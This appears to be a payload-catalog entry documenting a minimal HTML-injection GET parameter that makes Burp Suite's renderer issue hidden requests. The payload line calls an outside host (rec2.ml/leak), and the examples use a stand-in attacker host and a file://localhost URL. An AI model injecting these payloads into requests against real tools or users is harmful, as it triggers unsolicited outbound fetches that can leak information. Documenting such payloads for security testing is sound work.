---
id: cmd-minimal-get-injection
data: '?=<html><img+src=''http://www.rec2.ml/leak''>'
tags:
  - html-injection
type: command
output: 'Burp Suite makes hidden HTTP request to http://www.rec2.ml/leak.'
executor: http
platforms:
  - Desktop
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:56.369Z'
verified: false
validated: true
submitted: true
---
# Minimal-GET-Parameter-Injection

## Command

```http
?=<html><img+src='http://www.rec2.ml/leak'>
```

## Description

A minimal query parameter payload for GET requests, injecting an <img> tag to trigger fetches in Burp Suite's renderer for quick testing of the vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Query Parameter: =<html><img+src='http://www.rec2.ml/leak'> | Compact HTML img payload | Yes |

## Examples

### Basic Usage

Append to any GET URL: /path?=<html><img src='http://attacker.com'>

### Advanced Usage

Combine with other params: ?id=1&payload=<html><img src='file://localhost'>

## Expected Output

Upon rendering, Burp fetches the src URL directly, enabling leak or protocol trigger.

## Related

- [[commands/GET-Request-with-IMG-Tag-Injection]]
- [[procedures/Issue-Unsolicited-Requests-via-Swing-Parser]]
